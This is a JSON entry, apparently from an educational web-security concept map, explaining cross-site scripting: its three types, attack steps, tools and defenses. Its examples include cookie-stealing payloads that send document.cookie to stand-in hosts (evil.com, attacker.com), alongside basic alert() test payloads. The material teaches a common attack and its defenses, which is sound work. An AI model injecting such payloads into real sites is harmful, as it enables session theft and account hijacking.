@@ -1,0 +1,55 @@
+{
+  "id": "xss",
+  "title": "Cross-Site Scripting (XSS)",
+  "shortName": "XSS",
+  "type": "attack",
+  "osiLayer": 7,
+  "category": "web_attack",
+  "severity": "high",
+  "description": "Injecting malicious JavaScript into web pages viewed by other users.",
+  "fullExplanation": "XSS occurs when an attacker injects malicious scripts into content from otherwise trusted websites. The victim's browser executes the malicious script, which can steal cookies, session tokens, or other sensitive information. There are three main types: Reflected XSS (script in URL), Stored XSS (script saved in database), and DOM-based XSS (client-side script manipulation).",
+  "types": [
+    {
+      "name": "Reflected XSS",
+      "description": "Malicious script is part of the request (URL parameter). Server reflects it back in response.",
+      "example": "https://site.com/search?q=<script>alert(document.cookie)</script>"
+    },
+    {
+      "name": "Stored XSS",
+      "description": "Malicious script is stored in database (comment, profile). Executed when page loads.",
+      "example": "Comment: <script>fetch('https://evil.com?cookie='+document.cookie)</script>"
+    },
+    {
+      "name": "DOM-based XSS",
+      "description": "Vulnerability in client-side JavaScript that processes user input unsafely.",
+      "example": "document.write(location.hash) with #<img src=x onerror=alert(1)>"
+    }
+  ],
+  "attackSteps": [
+    { "step": 1, "action": "Find injection point", "description": "Search for input fields, URL parameters, or user-generated content" },
+    { "step": 2, "action": "Test for XSS", "description": "Try payloads like <script>alert(1)</script> or <img src=x onerror=alert(1)>" },
+    { "step": 3, "action": "Craft payload", "description": "Create script to steal cookies: document.location='http://attacker.com?c='+document.cookie" },
+    { "step": 4, "action": "Deliver payload", "description": "Send malicious link to victim (reflected) or post comment (stored)" },
+    { "step": 5, "action": "Steal data", "description": "Victim's browser executes script, sends cookies/tokens to attacker" }
+  ],
+  "tools": ["Burp Suite", "XSS Hunter", "BeEF", "XSSer", "Browser DevTools"],
+  "keyFacts": [
+    "XSS is one of the most common web vulnerabilities",
+    "Can steal session cookies and hijack accounts",
+    "HttpOnly flag prevents JavaScript from accessing cookies",
+    "Content Security Policy (CSP) blocks inline scripts",
+    "Always encode/escape user input before displaying",
+    "DOM-based XSS happens entirely in the browser"
+  ],
+  "defenses": [
+    { "name": "Input Validation", "description": "Whitelist allowed characters, reject suspicious input" },
+    { "name": "Output Encoding", "description": "HTML-encode all user input before displaying: < becomes &lt;" },
+    { "name": "Content Security Policy", "description": "HTTP header that blocks inline scripts and restricts script sources" },
+    { "name": "HttpOnly Cookies", "description": "Set HttpOnly flag so JavaScript cannot access cookies" },
+    { "name": "X-XSS-Protection Header", "description": "Browser feature to detect and block reflected XSS" },
+    { "name": "Use Framework Protection", "description": "React, Angular auto-escape by default" }
+  ],
+  "parent": "attacks",
+  "relatedConcepts": ["http", "csrf", "session-hijacking", "csp", "same-origin-policy"],
+  "visualization": { "color": "#ff3366", "icon": "💉", "nodeType": "leaf" }
+}
